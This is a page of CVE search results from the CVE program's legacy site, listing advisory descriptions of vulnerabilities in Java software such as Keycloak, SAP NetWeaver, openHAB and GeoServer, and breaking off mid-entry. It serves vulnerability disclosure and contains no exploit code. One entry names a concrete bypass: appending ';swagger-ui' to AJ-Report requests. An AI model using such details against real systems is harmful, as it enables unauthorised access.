<?xml version="1.0"?> 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
        <meta name="keywords"
            content="CVE, CVE List, CVE Records, CVE ID, CVE IDs, CVE Identifier, CVE Identifiers, CVE ID number, CVE ID numbers, CVE number, CVE numbers, CVE Record, CVE Records, CVE Entry, CVE Entries, CVE name, CVEs, CVE-, Reserved but Public, RBP, CVE Numbering Authority, CVE Naming Authority, CNA, CNAs, Root, Top-Level Root, TL-Root, CNA of Last Resort, CNA-LR, Secretariat, Authorized Data Publisher, ADP, CVE Adoption, CVE Automation, CVE Services, CVE JSON, National Vulnerability Database, NVD, Common Vulnerability Scoring System, CVSS, scoring, severity secoring, standard, standards, vulnerability, vulnerabilities, vulnerability management, vulnerability id, vulnerability name, vulnerability naming, vulnerability naming scheme, software flaw, software coding error, software bug, software bugs, firmware, network security, cybersecurity, cyber security, cyber security standards, cybersecurity standards, infosec, information security, information security standards, network security standards, community standards, vulnerability database, security advisory, security advisories, security alerts, vulnerability alerts, zero-day, 0-day, vulnerability assessment and remediation, vulnerability assessment service, vulnerability notification service, intrusion detection service, IDS, intrusion detection and management, intrusion monitoring and response service, intrusion prevention service, IPS, incident management, data/event correlation, firewall, patch management, patches, patching, enterprise information security architecture, SIM, security information management, cloud, cloud security, policy compliance, information security automation, cybersecurity automation, CVE Working Groups, CVE Board, DHS, Cybersecurity and Infrastructure Security Agency, CISA" />
        <meta name="description"
            content="The mission of the CVE® Program is to identify, define, and catalog publicly disclosed cybersecurity vulnerabilities." />
        <meta name="google-site-verification" content="Dk82cCXTLpuQQok4nbpDBxZDpA3ltnSAnnhMqY1XBxI" />
        <!-- Google tag (gtag.js) -->
            <script async src="https://www.googletagmanager.com/gtag/js?id=UA-37948909-1"></script>
            <script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());

            gtag('config', 'UA-37948909-1');
            </script>
  
        <link href="/css/main.css" rel="stylesheet" type="text/css" />
        <script src="/includes/jquery-3.2.1.min.js"></script>
        <script src="/includes/jquery-migrate-3.0.0.min.js"></script>
		<script src="/includes/browserheight.js" language="JavaScript" type="text/javascript"></script>
        <script src="https://cmp.osano.com/AzyhULTdPkqmy4aDN/fab1add1-e069-4b98-8ba9-cbdc6401a635/osano.js"></script>
        <link href="/css/print.css" rel="stylesheet" media="print" type="text/css" />
        <title>CVE -
Search Results
</title>
    </head>
    <body>
        <div id="Page"> 
            <!--Header-->
            <div id="Header">
                <table style="width:100%;border-collapse:collapse" summary="Header Layout Table">

                    <tr> 
                        <td style="vertical-align:middle; text-align:left; white-space:nowrap; padding-top:5px; padding-bottom:5px">
                            <div style="width:170px;">
                                <a class="none" href="/index.html">
                                    <img src="/images/cvelogobanner.png" width="206" height="55" alt="CVE" style="border:0" />
                                </a>
                                </div>
                        </td>
        <td style="vertical-align:top;text-align:center;width:100%">
                             
        <div class="alignright" style="float:right;vertical-align:top;">
        <table style="text-align:right"></table>
				
		</div> 

        <!--Page-->
        						
        					
<head>
<style>
.dropbtn {
    background-color: #ffffff;
    color: #C8C8C8;
    padding: 0px 18px;
    font-size: 15px;
    font-weight: bold;
    border: none;
    cursor: pointer;
}

.dropdown {
    position: relative;
    display: inline-block;
}

.dropdown-content {
    display: none;
    position: absolute;
    text-align: left;
    background-color: #ffffff;
    min-width: 250px;
    box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
    z-index: 1;
}

.dropdown-content a {
    color: black;
    padding: 12px 16px;
    font-size: 11px;
    text-align: left;
    text-decoration: none;
    display: block;
}

.dropdown-content a:hover {background-color: #cccccc;}

.dropdown:hover .dropdown-content {
    display: block;
}

.dropdown:hover .dropbtn {
    background-color: #ffffff;
}
</style>
</head>
<body>
&nbsp;&nbsp;&nbsp;&nbsp;
<div class="dropdown">
  <a target="_blank" href="https://www.cve.org/"><button class="dropbtn">CVE List&#9662;</button></a>
  <div class="dropdown-content">
    <strong><a href="/cve/search_cve_list.html">CVE List Search</a></strong>
    <a href="https://www.cve.org/ResourcesSupport/FAQs#pc_cve_list_basicssearch_cve">Search Tips</a>
    <strong><a href="https://cveform.mitre.org/">CVE Request Web Form</a></strong>
    <a href="https://www.cve.org/ResourcesSupport/FAQs#pc_cve_request_web_form">Web Form Help</a>
    <a href="https://www.cve.org/ResourcesSupport/FAQs#pc_cve_request_web_formweb_form_encrypt_requests">PGP Key</a> 
    <strong><a href="https://www.cve.org/Legal/TermsOfUse">Terms of Use</a></strong>
  </div>  
  </div>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <div class="dropdown">
  <a href="https://www.cve.org/ProgramOrganization/CNAs"><button class="dropbtn">CNAs&#9662;</button></a>
  <div class="dropdown-content">
    <strong><a href="https://www.cve.org/ProgramOrganization/CNAs">CVE Numbering Authorities (CNAs)</a></strong>
    <strong><a href="https://www.cve.org/PartnerInformation/Partner#HowToBecomeAPartner">How to Become a CNA</a></strong>
  </div>
  </div>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <div class="dropdown">
  <a href="https://www.cve.org/ProgramOrganization/WorkingGroups"><button class="dropbtn">WGs&#9662;</button></a>
  <div class="dropdown-content">
        <strong><a href="https://www.cve.org/ProgramOrganization/WorkingGroups">CVE Working Groups</a></strong>  
  </div>
  </div>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <div class="dropdown">
  <a href="https://www.cve.org/ProgramOrganization/Board"><button class="dropbtn">Board&#9662;</button></a>
  <div class="dropdown-content">
    <strong><a href="https://www.cve.org/ProgramOrganization/Board">CVE Board</a></strong>
    <a href="/community/board/archive.html#meeting_summaries">Meeting Archives</a>    
    <a href="https://www.cve.org/ProgramOrganization/Board#Resources">Email Archives</a>
  </div>
  </div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <div class="dropdown">
  <a href="https://www.cve.org/About/Overview"><button class="dropbtn">About&#9662;</button></a>
  <div class="dropdown-content">
    <strong><a href="https://www.cve.org/About/Overview">About CVE</a></strong>
  </div>
  </div>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <div class="dropdown">
  <a href="https://www.cve.org/Media/News/AllNews"><button class="dropbtn">News&#9662;</button></a>
  <div class="dropdown-content">
    <strong><a href="https://www.cve.org/Media/News/AllNews">News, Blogs &amp; Podcasts</a></strong>
  </div> 
  </div>
</div>
</body>
                                    
                                    
        <!--Page-->
        						
        						</div>

                                    
                                <div style="width:50%;"><p><a href="/index.html"></a></div>
                            </div>
                        </td>
                    </tr>
                    <tr>
                        <td colspan="2" style="vertical-align:top">
                        <!--NavBar-->
                        <div id="NavBar" class="noprint">
                        &nbsp; &nbsp; &nbsp; &nbsp;
                        <div class="NavSection"><a href="/cve/search_cve_list.html">Search CVE List</a></div> 
                        &nbsp; &nbsp; &nbsp; &nbsp;
                        <div class="NavSection"><a href="https://www.cve.org/Downloads">Downloads</a></div>  
                        &nbsp; &nbsp; &nbsp; &nbsp; 
                        <div class="NavSection"><a href="https://www.cve.org/ResourcesSupport/FAQs#pc_cve_list_basicscve_list_data_feeds">Data Feeds</a></div>  
                        &nbsp; &nbsp; &nbsp; &nbsp;
                        <div class="NavSection"><a href="https://www.cve.org/ReportRequest/ReportRequestForNonCNAs#UpdateCVERecord">Update a CVE Record</a> </div>  
                        &nbsp; &nbsp; &nbsp; &nbsp;   
                        <div class="NavSection"><a href="https://www.cve.org/ReportRequest/ReportRequestForNonCNAs#RequestCVEID">Request CVE IDs</a></div>
                        &nbsp; &nbsp; &nbsp; &nbsp;     
                        </div>
                        <!--/NavBar-->
                        </td>
                    </tr>
                    <tr>
                        <td colspan="2" style="vertical-align:top">
                            <!--HeaderBar-->

                            <div id="HeaderBar" class="noprint"> 
                            TOTAL CVE Records: <a target="_blank" href="https://www.cve.org/">
                           
                            240830</a>
                            <br><br>
NOTICE: <span class="ltredbold">Transition to the all-new CVE website at <a href="https://www.cve.org/">WWW.CVE.ORG</a> and <a href="https://www.cve.org/Media/News/item/blog/2022/10/06/CVE-Records-Are-Now-Displayed">CVE Record Format JSON</a> are underway.</span>
<br><br>
NOTICE: <span class="ltredbold">Support for the legacy CVE download formats <a href="https://www.cve.org/Media/News/item/blog/2024/07/02/Legacy-CVE-Download-Formats-No-Longer-Supported">ended on June 30, 2024</a>.<br/>New CVE List download format is <a href="https://www.cve.org/Media/News/item/blog/2023/03/29/CVE-Downloads-in-JSON-5-Format">available now</a> on CVE.ORG.</span>
                            <br><br>
                            </div></div>
                            <!--/HeaderBar-->
                        </td>
                    </tr>
                </table>
                
                	<style type="text/css">
.alignright {
	text-align: right;
	font-size: x-small;
}
</style>

                <div id="BreadCrumbs" class="noprint">

		<a href="/">Home</a>  &gt;  <a href="/cve/">CVE</a>  &gt;  Search Results
                    &nbsp;</div>
            </div>
            <!--/Header-->
            <!-- begin section menu -->
            <div id="LeftPane">﻿            </div>
            <!-- end section menu -->
            <!-- begin content pane -->
            <div id="CenterPane"><!--begin Main Content-->

<h2>Search Results</h2>

<div class="smaller" style="background-color:#e0dbd2; padding:3px; border:1px solid #706c60; margin-bottom:10px">
There are <b>2851</b> CVE Records that match your search.
</div>

<div id="TableWithRules">
<table cellpadding="0" cellspacing="0" border="0" width="100%">
<thead>
	<tr>
		<th valign="top" style="padding:3px">Name</th>
		<th valign="top" style="padding:3px">Description</th>
	</tr>
</thead>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-9048">CVE-2024-9048</a></td>
		<td valign="top">A vulnerability was found in y_project RuoYi up to 4.7.9. It has been declared as problematic. Affected by this vulnerability is the function SysUserServiceImpl of the file ruoyi-system/src/main/java/com/ruoyi/system/service/impl/SysUserServiceImpl.java of the component Backend User Import. The manipulation of the argument loginName leads to cross site scripting. The attack can be launched remotely. The complexity of an attack is rather high. The exploitation appears to be difficult. The exploit has been disclosed to the public and may be used. The patch is named 9b68013b2af87b9c809c4637299abd929bc73510. It is recommended to apply a patch to fix this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-8883">CVE-2024-8883</a></td>
		<td valign="top">A misconfiguration flaw was found in Keycloak. This issue can allow an attacker to redirect users to an arbitrary URL if a 'Valid Redirect URI' is set to http://localhost or http://127.0.0.1, enabling sensitive information such as authorization codes to be exposed to the attacker, potentially leading to session hijacking.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-8698">CVE-2024-8698</a></td>
		<td valign="top">A flaw exists in the SAML signature validation method within the Keycloak XMLSignatureUtil class. The method incorrectly determines whether a SAML signature is for the full document or only for specific assertions based on the position of the signature in the XML document, rather than the Reference element used to specify the signed element. This flaw allows attackers to create crafted responses that can bypass the validation, potentially leading to privilege escalation or impersonation attacks.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-8391">CVE-2024-8391</a></td>
		<td valign="top">In Eclipse Vert.x version 4.3.0 to 4.5.9, the gRPC server does not limit the maximum length of message payload (Maven GAV: io.vertx:vertx-grpc-server and io.vertx:vertx-grpc-client). This is fixed in the 4.5.10 version. Note this does not affect the Vert.x gRPC server based grpc-java and Netty libraries (Maven GAV: io.vertx:vertx-grpc)

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-8367">CVE-2024-8367</a></td>
		<td valign="top">A vulnerability was found in HM Courts &amp; Tribunals Service Probate Back Office up to c1afe0cdb2b2766d9e24872c4e827f8b82a6cd31. It has been classified as problematic. Affected is an unknown function of the file src/main/java/uk/gov/hmcts/probate/service/NotificationService.java of the component Markdown Handler. The manipulation leads to injection. Continious delivery with rolling releases is used by this product. Therefore, no version details of affected nor updated releases are available. The patch is identified as d90230d7cf575e5b0852d56660104c8bd2503c34. It is recommended to apply a patch to fix this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-7314">CVE-2024-7314</a></td>
		<td valign="top">anji-plus AJ-Report is affected by an authentication bypass vulnerability. A remote and unauthenticated attacker can append ";swagger-ui" to HTTP requests to bypass authentication and execute arbitrary Java on the victim server.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-7254">CVE-2024-7254</a></td>
		<td valign="top">Any project that parses untrusted Protocol Buffers data containing an arbitrary number of nested groups / series of SGROUP tags can corrupted by exceeding the stack limit i.e. StackOverflow. Parsing nested groups as unknown fields with DiscardUnknownFieldsParser or Java Protobuf Lite parser, or against Protobuf map fields, creates unbounded recursions that can be abused by an attacker.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-6960">CVE-2024-6960</a></td>
		<td valign="top">The H2O machine learning platform uses "Iced" classes as the primary means of moving Java Objects around the cluster. The Iced format supports inclusion of serialized Java objects. When a model is deserialized, any class is allowed to be deserialized (no class whitelist). An attacker can construct a crafted Iced model that uses Java gadgets and leads to arbitrary code execution when imported to the H2O platform.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-6441">CVE-2024-6441</a></td>
		<td valign="top">A vulnerability was found in ORIPA up to 1.72. It has been declared as critical. Affected by this vulnerability is an unknown functionality of the file src/main/java/oripa/persistence/doc/loader/LoaderXML.java. The manipulation leads to deserialization. The attack can be launched remotely. Upgrading to version 1.80 is able to address this issue. It is recommended to upgrade the affected component. The identifier VDB-270169 was assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-5971">CVE-2024-5971</a></td>
		<td valign="top">A vulnerability was found in Undertow, where the chunked response hangs after the body was flushed. The response headers and body were sent but the client would continue waiting as Undertow does not send the expected 0\r\n termination of the chunked response. This results in uncontrolled resource consumption, leaving the server side to a denial of service attack. This happens only with Java 17 TLSv1.3 scenarios.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-45294">CVE-2024-45294</a></td>
		<td valign="top">The HL7 FHIR Core Artifacts repository provides the java core object handling code, with utilities (including validator), for the Fast Healthcare Interoperability Resources (FHIR) specification. Prior to version 6.3.23, XSLT transforms performed by various components are vulnerable to XML external entity injections. A processed XML file with a malicious DTD tag could produce XML containing data from the host system. This impacts use cases where org.hl7.fhir.core is being used to within a host where external clients can submit XML. This issue has been patched in release 6.3.23. No known workarounds are available.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-45283">CVE-2024-45283</a></td>
		<td valign="top">SAP NetWeaver AS for Java allows an authorized attacker to obtain sensitive information. The attacker could obtain the username and password when creating an RFC destination. After successful exploitation, an attacker can read the sensitive information but cannot modify or delete the data.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-45280">CVE-2024-45280</a></td>
		<td valign="top">Due to insufficient encoding of user-controlled inputs, SAP NetWeaver AS Java allows malicious scripts to be executed in the login application. This has a limited impact on confidentiality and integrity of the application. There is no impact on availability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-44676">CVE-2024-44676</a></td>
		<td valign="top">eladmin v2.7 and before is vulnerable to Cross Site Scripting (XSS) which allows an attacker to execute arbitrary code via LocalStoreController. java.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-42468">CVE-2024-42468</a></td>
		<td valign="top">openHAB, a provider of open-source home automation software, has add-ons including the visualization add-on CometVisu. CometVisuServlet in versions prior to 4.2.1 is susceptible to an unauthenticated path traversal vulnerability. Local files on the server can be requested via HTTP GET on the CometVisuServlet. This issue may lead to information disclosure. Users should upgrade to version 4.2.1 of the CometVisu add-on of openHAB to receive a patch.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-42467">CVE-2024-42467</a></td>
		<td valign="top">openHAB, a provider of open-source home automation software, has add-ons including the visualization add-on CometVisu. Prior to version 4.2.1, the proxy endpoint of openHAB's CometVisu add-on can be accessed without authentication. This proxy-feature can be exploited as Server-Side Request Forgery (SSRF) to induce GET HTTP requests to internal-only servers, in case openHAB is exposed in a non-private network. Furthermore, this proxy-feature can also be exploited as a Cross-Site Scripting (XSS) vulnerability, as an attacker is able to re-route a request to their server and return a page with malicious JavaScript code. Since the browser receives this data directly from the openHAB CometVisu UI, this JavaScript code will be executed with the origin of the CometVisu UI. This allows an attacker to exploit call endpoints on an openHAB server even if the openHAB server is located in a private network. (e.g. by sending an openHAB admin a link that proxies malicious JavaScript.) This issue may lead up to Remote Code Execution (RCE) when chained with other vulnerabilities. Users should upgrade to version 4.2.1 of the CometVisu add-on of openHAB to receive a patch.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-42374">CVE-2024-42374</a></td>
		<td valign="top">BEx Web Java Runtime Export Web Service does not sufficiently validate an XML document accepted from an untrusted source. An attacker can retrieve information from the SAP ADS system and exhaust the number of XMLForm service which makes the SAP ADS rendering (PDF creation) unavailable. This affects the confidentiality and availability of the application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-42361">CVE-2024-42361</a></td>
		<td valign="top">Hertzbeat is an open source, real-time monitoring system. Hertzbeat 1.6.0 and earlier declares a /api/monitor/{monitorId}/metric/{metricFull} endpoint to download job metrics. In the process, it executes a SQL query with user-controlled data, allowing for SQL injection.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-41948">CVE-2024-41948</a></td>
		<td valign="top">biscuit-java is the java implementation of Biscuit, an authentication and authorization token for microservices architectures. Third-party blocks can be generated without transferring the whole token to the third-party authority. Instead, a ThirdPartyBlock request can be sent, providing only the necessary info to generate a third-party block and to sign it, which includes the public key of the previous block (used in the signature) and the public keys part of the token symbol table (for public key interning in datalog expressions). A third-part block request forged by a malicious user can trick the third-party authority into generating datalog trusting the wrong keypair. This vulnerability is fixed in 4.0.0.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-40642">CVE-2024-40642</a></td>
		<td valign="top">The netty incubator codec.bhttp is a java language binary http parser. In affected versions the `BinaryHttpParser` class does not properly validate input values thus giving attackers almost complete control over the HTTP requests constructed from the parsed output. Attackers can abuse several issues individually to perform various injection attacks including HTTP request smuggling, desync attacks, HTTP header injections, request queue poisoning, caching attacks and Server Side Request Forgery (SSRF). Attacker could also combine several issues to create well-formed messages for other text-based protocols which may result in attacks beyond the HTTP protocol. The BinaryHttpParser class implements the readRequestHead method which performs most of the relevant parsing of the received request. The data structure prefixes values with a variable length integer value. The parsing code below first gets the lengths of the values from the prefixed variable length integer. After it has all of the lengths and calculates all of the indices, the parser casts the applicable slices of the ByteBuf to String. Finally, it passes these values into a new `DefaultBinaryHttpRequest` object where no further parsing or validation occurs. Method is partially validated while other values are not validated at all. Software that relies on netty to apply input validation for binary HTTP data may be vulnerable to various injection and protocol based attacks. This issue has been addressed in version 0.0.13.Final. Users are advised to upgrade. There are no known workarounds for this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-40094">CVE-2024-40094</a></td>
		<td valign="top">GraphQL Java (aka graphql-java) before 21.5 does not properly consider ExecutableNormalizedFields (ENFs) as part of preventing denial of service via introspection queries. 20.9 and 19.11 are also fixed versions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-3967">CVE-2024-3967</a></td>
		<td valign="top">Remote Code Execution has been discovered in OpenText&amp;#8482; iManager 3.2.6.0200. The vulnerability can trigger remote code execution unisng unsafe java object deserialization.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-39669">CVE-2024-39669</a></td>
		<td valign="top">In the Console in Soffid IAM before 3.5.39, necessary checks were not applied to some Java objects. A malicious agent could possibly execute arbitrary code in the Sync Server and compromise security.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-39326">CVE-2024-39326</a></td>
		<td valign="top">SkillTree is a micro-learning gamification platform. Prior to version 2.12.6, the endpoint `/admin/projects/{projectname}/skills/{skillname}/video` (and probably others) is open to a cross-site request forgery (CSRF) vulnerability. Due to the endpoint being CSRFable e.g POST request, supports a content type that can be exploited (multipart file upload), makes a state change and has no CSRF mitigations in place (samesite flag, CSRF token). It is possible to perform a CSRF attack against a logged in admin account, allowing an attacker that can target a logged in admin of Skills Service to modify the videos, captions, and text of the skill. Version 2.12.6 contains a patch for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-38374">CVE-2024-38374</a></td>
		<td valign="top">The CycloneDX core module provides a model representation of the SBOM along with utilities to assist in creating, validating, and parsing SBOMs. Before deserializing CycloneDX Bill of Materials in XML format, _cyclonedx-core-java_ leverages XPath expressions to determine the schema version of the BOM. The `DocumentBuilderFactory` used to evaluate XPath expressions was not configured securely, making the library vulnerable to XML External Entity (XXE) injection. This vulnerability has been fixed in cyclonedx-core-java version 9.0.4.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-37902">CVE-2024-37902</a></td>
		<td valign="top">DeepJavaLibrary(DJL) is an Engine-Agnostic Deep Learning Framework in Java. DJL versions 0.1.0 through 0.27.0 do not prevent absolute path archived artifacts from inserting archived files directly into the system, overwriting system files. This is fixed in DJL 0.28.0 and patched in DJL Large Model Inference containers version 0.27.0. Users are advised to upgrade.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-36404">CVE-2024-36404</a></td>
		<td valign="top">GeoTools is an open source Java library that provides tools for geospatial data. Prior to versions 31.2, 30.4, and 29.6, Remote Code Execution (RCE) is possible if an application uses certain GeoTools functionality to evaluate XPath expressions supplied by user input. Versions 31.2, 30.4, and 29.6 contain a fix for this issue. As a workaround, GeoTools can operate with reduced functionality by removing the `gt-complex` jar from one's application. As an example of the impact, application schema `datastore` would not function without the ability to use XPath expressions to query complex content. Alternatively, one may utilize a drop-in replacement GeoTools jar from SourceForge for versions 31.1, 30.3, 30.2, 29.2, 28.2, 27.5, 27.4, 26.7, 26.4, 25.2, and 24.0. These jars are for download only and are not available from maven central, intended to quickly provide a fix to affected applications.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-36121">CVE-2024-36121</a></td>
		<td valign="top">netty-incubator-codec-ohttp is the OHTTP implementation for netty. BoringSSLAEADContext keeps track of how many OHTTP responses have been sent and uses this sequence number to calculate the appropriate nonce to use with the encryption algorithm. Unfortunately, two separate errors combine which would allow an attacker to cause the sequence number to overflow and thus the nonce to repeat.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-36114">CVE-2024-36114</a></td>
		<td valign="top">Aircompressor is a library with ports of the Snappy, LZO, LZ4, and Zstandard compression algorithms to Java. All decompressor implementations of Aircompressor (LZ4, LZO, Snappy, Zstandard) can crash the JVM for certain input, and in some cases also leak the content of other memory of the Java process (which could contain sensitive information). When decompressing certain data, the decompressors try to access memory outside the bounds of the given byte arrays or byte buffers. Because Aircompressor uses the JDK class `sun.misc.Unsafe` to speed up memory access, no additional bounds checks are performed and this has similar security consequences as out-of-bounds access in C or C++, namely it can lead to non-deterministic behavior or crash the JVM. Users should update to Aircompressor 0.27 or newer where these issues have been fixed. When decompressing data from untrusted users, this can be exploited for a denial-of-service attack by crashing the JVM, or to leak other sensitive information from the Java process. There are no known workarounds for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-34696">CVE-2024-34696</a></td>
		<td valign="top">GeoServer is an open source server that allows users to share and edit geospatial data. Starting in version 2.10.0 and prior to versions 2.24.4 and 2.25.1, GeoServer's Server Status page and REST API lists all environment variables and Java properties to any GeoServer user with administrative rights as part of those modules' status message. These variables/properties can also contain sensitive information, such as database passwords or API keys/tokens. Additionally, many community-developed GeoServer container images `export` other credentials from their start-up scripts as environment variables to the GeoServer (`java`) process. The precise scope of the issue depends on which container image is used and how it is configured. The `about status` API endpoint which powers the Server Status page is only available to administrators.Depending on the operating environment, administrators might have legitimate access to credentials in other ways, but this issue defeats more sophisticated controls (like break-glass access to secrets or role accounts).By default, GeoServer only allows same-origin authenticated API access. This limits the scope for a third-party attacker to use an administrator&amp;#8217;s credentials to gain access to credentials. The researchers who found the vulnerability were unable to determine any other conditions under which the GeoServer REST API may be available more broadly. Users should update container images to use GeoServer 2.24.4 or 2.25.1 to get the bug fix. As a workaround, leave environment variables and Java system properties hidden by default. Those who provide the option to re-enable it should communicate the impact and risks so that users can make an informed choice.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-34688">CVE-2024-34688</a></td>
		<td valign="top">Due to unrestricted access to the Meta Model Repository services in SAP NetWeaver AS Java, attackers can perform DoS attacks on the application, which may prevent legitimate users from accessing it. This can result in no impact on confidentiality and integrity but a high impact on the availability of the application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-34447">CVE-2024-34447</a></td>
		<td valign="top">An issue was discovered in Bouncy Castle Java Cryptography APIs before BC 1.78. When endpoint identification is enabled in the BCJSSE and an SSL socket is created without an explicit hostname (as happens with HttpsURLConnection), hostname verification could be performed against a DNS-resolved IP address in some situations, opening up a possibility of DNS poisoning.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-34148">CVE-2024-34148</a></td>
		<td valign="top">Jenkins Subversion Partial Release Manager Plugin 1.0.1 and earlier programmatically disables the fix for CVE-2016-3721 whenever a build is triggered from a release tag, by setting the Java system property 'hudson.model.ParametersAction.keepUndefinedParameters'.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-33117">CVE-2024-33117</a></td>
		<td valign="top">crmeb_java v1.3.4 was discovered to contain a Server-Side Request Forgery (SSRF) via the mergeList method in class com.zbkj.front.pub.ImageMergeController.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-33005">CVE-2024-33005</a></td>
		<td valign="top">Due to the missing authorization checks in the local systems, the admin users of SAP Web Dispatcher, SAP NetWeaver Application Server (ABAP and Java), and SAP Content Server can impersonate other users and may perform some unintended actions. This could lead to a low impact on confidentiality and a high impact on the integrity and availability of the applications.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-32888">CVE-2024-32888</a></td>
		<td valign="top">The Amazon JDBC Driver for Redshift is a Type 4 JDBC driver that provides database connectivity through the standard JDBC application program interfaces (APIs) available in the Java Platform, Enterprise Editions. Prior to version 2.1.0.28, SQL injection is possible when using the non-default connection property `preferQueryMode=simple` in combination with application code which has a vulnerable SQL that negates a parameter value. There is no vulnerability in the driver when using the default, extended query mode. Note that `preferQueryMode` is not a supported parameter in Redshift JDBC driver, and is inherited code from Postgres JDBC driver. Users who do not override default settings to utilize this unsupported query mode are not affected. This issue is patched in driver version 2.1.0.28. As a workaround, do not use the connection property `preferQueryMode=simple`. (NOTE: Those who do not explicitly specify a query mode use the default of extended query mode and are not affected by this issue.)

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-32876">CVE-2024-32876</a></td>
		<td valign="top">NewPipe is an Android app for video streaming written in Java. It supports exporting and importing backups, as a way to let users move their data to a new device effortlessly. However, in versions 0.13.4 through 0.26.1, importing a backup file from an untrusted source could have resulted in Arbitrary Code Execution. This is because backups are serialized/deserialized using Java's Object Serialization Stream Protocol, which can allow constructing any class in the app, unless properly restricted. To exploit this vulnerability, an attacker would need to build a backup file containing the exploit, and then persuade a user into importing it. During the import process, the malicious code would be executed, possibly crashing the app, stealing user data from the NewPipe app, performing nasty actions through Android APIs, and attempting Android JVM/Sandbox escapes through vulnerabilities in the Android OS. The attack can take place only if the user imports a malicious backup file, so an attacker would need to trick a user into importing a backup file from a source they can control. The implementation details of the malicious backup file can be independent of the attacked user or the device they are being run on, and do not require additional privileges. All NewPipe versions from 0.13.4 to 0.26.1 are vulnerable. NewPipe version 0.27.0 fixes the issue by doing the following: 